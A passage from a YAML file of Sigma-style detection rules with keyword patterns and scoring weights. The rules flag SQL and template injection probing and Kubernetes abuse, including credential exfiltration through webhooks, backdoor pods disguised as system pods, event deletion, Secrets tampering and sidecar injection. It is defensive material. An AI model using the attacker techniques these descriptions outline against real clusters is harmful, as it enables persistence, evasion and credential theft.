    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_8a670c6d_7189_4b1c_8017_a417ca84a086
  intent: unknown
  tactic: initial_access
  description: Detects SQL error messages that indicate probing for an injection attack
  conditions:
    summary:
      regex_any:
      - suspicious
      - error
      - messages
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_16c86189_b556_4ee8_b4c7_7e350a195a4f
  intent: unknown
  tactic: initial_access
  description: Detects exceptions in velocity template renderer, this most likely
    happens due to dynamic rendering of user input and may lead to RCE.
  conditions:
    summary:
      regex_any:
      - potential
      - server
      - side
      - template
      - injection
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_eed82177_38f5_4299_8a76_098d50d225ab
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects when a modification (create, update or replace) action is
    taken that affects mutating or validating webhook configurations, as they can
    be used by an adversary to achieve persistence or exfiltrate access credentials.

    '
  conditions:
    summary:
      regex_any:
      - kubernetes
      - admission
      - controller
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_0c9b3bda_41a6_4442_9345_356ae86343dc
  intent: execution
  tactic: execution
  description: 'Detects when a Kubernetes CronJob or Job is created or modified.

    A Kubernetes Job creates one or more pods to accomplish a specific task, and a
    CronJob creates Jobs on a recurring schedule.

    An adversary can take advantage of this Kubernetes object to schedule Jobs to
    run containers that execute malicious code within a cluster, allowing them to
    achieve persistence.

    '
  conditions:
    summary:
      regex_any:
      - kubernetes
      - cronjob
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_3132570d_cab2_4561_9ea6_1743644b2290
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects when events are deleted in Kubernetes.

    An adversary may delete Kubernetes events in an attempt to evade detection.

    '
  conditions:
    summary:
      regex_any:
      - kubernetes
      - events
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a1b0ca4e_7835_413e_8471_3ff2b8a66be6
  intent: execution
  tactic: execution
  description: 'Detects attempts to execute remote commands, within a Pod''s container
    using e.g. the "kubectl exec" command.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - remote
      - command
      - execution
      - container
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_a80d927d_ac6e_443f_a867_e8d6e3897318
  intent: defense_evasion
  tactic: defense_evasion
  description: 'Detects deployments of pods within the kube-system namespace, which
    could be intended to imitate system pods.

    System pods, created by controllers such as Deployments or DaemonSets have random
    suffixes in their names.

    Attackers can use this fact and name their backdoor pods as if they were created
    by these controllers to avoid detection.

    Deployment of such a backdoor container e.g. named kube-proxy-bv61v, could be
    attempted in the kube-system namespace alongside the other administrative containers.

    '
  conditions:
    summary:
      regex_any:
      - creation
      - system
      - namespace
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_10b97915_ec8d_455f_a815_9a78926585f6
  intent: privilege_escalation_attempt
  tactic: privilege_escalation
  description: 'Detects when a Kubernetes Rolebinding is created or modified.

    '
  conditions:
    summary:
      regex_any:
      - kubernetes
      - rolebinding
      - modification
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_58d31a75_a4f8_4c40_985b_373d58162ca2
  intent: credential_harvesting
  tactic: credential_access
  description: 'Detects when Kubernetes Secrets are Modified or Deleted.

    '
  conditions:
    summary:
      regex_any:
      - kubernetes
      - secrets
      - modified
      - deleted
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
- id: sigma_ad9012a6_e518_4432_9890_f3b82b8fc71f
  intent: execution
  tactic: execution
  description: 'Detects attempts to inject a sidecar container into a running deployment.

    A sidecar container is an additional container within a pod, that resides alongside
    the main container.

    One way to add containers to running resources like Deployments/DeamonSets/StatefulSets,
    is via a "kubectl patch" operation.

    By injecting a new container within a legitimate pod, an attacker can run their
    code and hide their activity, instead of running their own separated pod in the
    cluster.

    '
  conditions:
    summary:
      regex_any:
      - potential
      - sidecar
      - injection
      - into
      - running
  weights:
    base: 0.6
    indicators_bonus: 0.1
    summary_bonus: 0.1
